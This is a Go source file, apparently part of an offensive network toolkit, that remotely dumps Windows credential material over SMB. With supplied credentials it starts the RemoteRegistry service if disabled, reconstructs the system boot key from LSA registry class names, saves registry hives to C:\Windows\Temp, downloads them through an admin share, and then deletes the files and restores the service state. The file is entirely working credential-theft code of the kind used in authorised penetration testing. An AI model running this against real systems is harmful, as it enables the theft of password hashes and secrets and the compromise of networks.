package main

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/jfjallid/go-smb/dcerpc"
	"github.com/jfjallid/go-smb/dcerpc/msrrp"
	"github.com/jfjallid/go-smb/dcerpc/msscmr"
	"github.com/jfjallid/go-smb/dcerpc/smbtransport"
	"github.com/jfjallid/go-smb/smb"

	"github.com/joda32/gonetkit/internal/credentials"
)

var bootKeyPermutation = []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}

type RemoteOps struct {
	session        *smb.Connection
	scmrRPC        *msscmr.RPCCon
	rrpRPC         *msrrp.RPCCon
	share          string
	debug          bool
	noCleanup      bool
	tmpFiles       []string
	regWasOff      bool
	regWasDisabled bool
	usedSCMR       bool
}

func NewRemoteOps(creds *credentials.Credentials, share string) (*RemoteOps, error) {
	opts, err := creds.SMBOptions()
	if err != nil {
		return nil, err
	}

	if creds.Debug {
		fmt.Fprintf(os.Stderr, "[*] Connecting to %s:%d\n", creds.TargetIP, creds.Port)
	}

	session, err := smb.NewConnection(opts)
	if err != nil {
		return nil, fmt.Errorf("SMB connection failed: %w", err)
	}

	if creds.Debug {
		fmt.Fprintf(os.Stderr, "[*] Authenticated as %s\n", session.GetAuthUsername())
	}

	ops := &RemoteOps{
		session: session,
		share:   share,
		debug:   creds.Debug,
	}

	if err := ops.session.TreeConnect("IPC$"); err != nil {
		session.Close()
		return nil, fmt.Errorf("IPC$ tree connect: %w", err)
	}

	if err := ops.connectRRP(); err != nil {
		if creds.Debug {
			fmt.Fprintf(os.Stderr, "[*] winreg pipe not available, starting RemoteRegistry via SCMR\n")
		}
		if err := ops.connectSCMR(); err != nil {
			session.Close()
			return nil, fmt.Errorf("SCMR: %w", err)
		}
		if err := ops.enableRemoteRegistry(); err != nil {
			session.Close()
			return nil, fmt.Errorf("enable remote registry: %w", err)
		}
		if err := ops.connectRRP(); err != nil {
			session.Close()
			return nil, fmt.Errorf("RRP: %w", err)
		}
	} else if creds.Debug {
		fmt.Fprintln(os.Stderr, "[*] Remote registry already available, skipping SCMR")
	}

	if err := session.TreeConnect(share); err != nil {
		session.Close()
		return nil, fmt.Errorf("tree connect %s: %w", share, err)
	}

	return ops, nil
}

func (ops *RemoteOps) connectSCMR() error {
	f, err := ops.session.OpenFile("IPC$", "svcctl")
	if err != nil {
		return fmt.Errorf("open svcctl pipe: %w", err)
	}

	trans, err := smbtransport.NewSMBTransport(f)
	if err != nil {
		return err
	}

	bind, err := dcerpc.Bind(trans, msscmr.MSRPCUuidSvcCtl, msscmr.MSRPCSvcCtlMajorVersion, msscmr.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		return err
	}

	ops.scmrRPC = msscmr.NewRPCCon(bind)
	ops.usedSCMR = true
	return nil
}

func (ops *RemoteOps) enableRemoteRegistry() error {
	status, err := ops.scmrRPC.GetServiceStatus("RemoteRegistry")
	if err != nil {
		return err
	}

	if status == msscmr.ServiceRunning {
		if ops.debug {
			fmt.Fprintln(os.Stderr, "[*] Remote registry already running")
		}
		return nil
	}

	if ops.debug {
		fmt.Fprintln(os.Stderr, "[*] Enabling remote registry")
	}

	config, err := ops.scmrRPC.GetServiceConfig("RemoteRegistry")
	if err != nil {
		return err
	}

	if config.StartType == "SERVICE_DISABLED" {
		ops.regWasDisabled = true
		if err := ops.scmrRPC.ChangeServiceConfig(
			"RemoteRegistry",
			msscmr.ServiceNoChange, msscmr.ServiceDemandStart, msscmr.ServiceNoChange,
			nil, nil, "", nil, nil, "", 0,
		); err != nil {
			return fmt.Errorf("change start type: %w", err)
		}
	}

	ops.regWasOff = true
	if err := ops.scmrRPC.StartService("RemoteRegistry", nil); err != nil {
		return fmt.Errorf("start service: %w", err)
	}

	time.Sleep(1 * time.Second)
	return nil
}

func (ops *RemoteOps) connectRRP() error {
	f, err := ops.session.OpenFile("IPC$", "winreg")
	if err != nil {
		return fmt.Errorf("open winreg pipe: %w", err)
	}

	trans, err := smbtransport.NewSMBTransport(f)
	if err != nil {
		return err
	}

	bind, err := dcerpc.Bind(trans, msrrp.MSRRPUuid, msrrp.MSRRPMajorVersion, msrrp.MSRRPMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		return err
	}

	ops.rrpRPC = msrrp.NewRPCCon(bind)
	return nil
}

func (ops *RemoteOps) GetBootKey() ([]byte, error) {
	hklm, err := ops.rrpRPC.OpenBaseKey(msrrp.HKEYLocalMachine)
	if err != nil {
		return nil, err
	}
	defer ops.rrpRPC.CloseKeyHandle(hklm)

	csKey, err := ops.getCurrentControlSet(hklm)
	if err != nil {
		return nil, err
	}

	lsaPath := csKey + `\Control\Lsa`
	keyNames := []string{"JD", "Skew1", "GBG", "Data"}
	var hexStr string

	for _, name := range keyNames {
		subkey, err := ops.rrpRPC.OpenSubKey(hklm, lsaPath+`\`+name)
		if err != nil {
			return nil, fmt.Errorf("open %s: %w", name, err)
		}
		info, err := ops.rrpRPC.QueryKeyInfo(subkey)
		ops.rrpRPC.CloseKeyHandle(subkey)
		if err != nil {
			return nil, fmt.Errorf("query %s: %w", name, err)
		}
		hexStr += info.ClassName
	}

	scrambled, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil, fmt.Errorf("decode bootkey hex: %w", err)
	}

	bootKey := make([]byte, 16)
	for i, p := range bootKeyPermutation {
		bootKey[i] = scrambled[p]
	}

	return bootKey, nil
}

func (ops *RemoteOps) getCurrentControlSet(hklm []byte) (string, error) {
	selectKey, err := ops.rrpRPC.OpenSubKey(hklm, `SYSTEM\Select`)
	if err != nil {
		return "", fmt.Errorf("open SYSTEM\\Select: %w", err)
	}
	defer ops.rrpRPC.CloseKeyHandle(selectKey)

	val, err := ops.rrpRPC.QueryValue(selectKey, "Current")
	if err != nil {
		return "", fmt.Errorf("query Current: %w", err)
	}

	if len(val) < 4 {
		return "", fmt.Errorf("unexpected Current value length: %d", len(val))
	}

	csNum := int(val[0])
	return fmt.Sprintf("ControlSet%03d", csNum), nil
}

func (ops *RemoteOps) SaveAndDownloadHive(hiveName string) ([]byte, error) {
	hklm, err := ops.rrpRPC.OpenBaseKey(msrrp.HKEYLocalMachine)
	if err != nil {
		return nil, err
	}
	defer ops.rrpRPC.CloseKeyHandle(hklm)

	hiveKey, err := ops.rrpRPC.OpenSubKey(hklm, hiveName)
	if err != nil {
		return nil, fmt.Errorf("open %s: %w", hiveName, err)
	}
	defer ops.rrpRPC.CloseKeyHandle(hiveKey)

	fname := tmpFileName()
	remotePath := `C:\Windows\Temp\` + fname
	if ops.debug {
		fmt.Fprintf(os.Stderr, "[*] Saving %s to %s\n", hiveName, remotePath)
	}

	if err := ops.rrpRPC.RegSaveKey(hiveKey, remotePath, ""); err != nil {
		return nil, fmt.Errorf("save %s: %w", hiveName, err)
	}

	sharePath := shareRelPath(ops.share, fname)
	ops.tmpFiles = append(ops.tmpFiles, sharePath)

	if ops.debug {
		fmt.Fprintf(os.Stderr, "[*] Downloading %s via %s\\%s\n", hiveName, ops.share, sharePath)
	}

	var buf bytes.Buffer
	err = ops.session.RetrieveFile(ops.share, sharePath, 0, func(data []byte) (int, error) {
		return buf.Write(data)
	})
	if err != nil {
		return nil, fmt.Errorf("download %s: %w", hiveName, err)
	}

	_ = ops.session.DeleteFile(ops.share, sharePath)

	return buf.Bytes(), nil
}

func tmpFileName() string {
	b := make([]byte, 4)
	rand.Read(b)
	return fmt.Sprintf("tmp%s.tmp", hex.EncodeToString(b))
}

func shareRelPath(share, fname string) string {
	upper := strings.ToUpper(share)
	switch upper {
	case "ADMIN$":
		return `Temp\` + fname
	case "C$":
		return `Windows\Temp\` + fname
	default:
		return fname
	}
}

func (ops *RemoteOps) Cleanup() {
	for _, f := range ops.tmpFiles {
		_ = ops.session.DeleteFile(ops.share, f)
	}

	if ops.regWasOff && !ops.noCleanup {
		if ops.debug {
			fmt.Fprintln(os.Stderr, "[*] Stopping remote registry")
		}
		_ = ops.scmrRPC.ControlService("RemoteRegistry", msscmr.ServiceControlStop)

		if ops.regWasDisabled {
			if ops.debug {
				fmt.Fprintln(os.Stderr, "[*] Restoring remote registry to disabled")
			}
			_ = ops.scmrRPC.ChangeServiceConfig(
				"RemoteRegistry",
				msscmr.ServiceNoChange, msscmr.ServiceDisabled, msscmr.ServiceNoChange,
				nil, nil, "", nil, nil, "", 0,
			)
		}
	} else if ops.regWasOff && ops.noCleanup && ops.debug {
		fmt.Fprintln(os.Stderr, "[*] Leaving RemoteRegistry running (-no-cleanup)")
	}

	_ = ops.session.TreeDisconnect(ops.share)
	_ = ops.session.TreeDisconnect("IPC$")
	ops.session.Close()
}
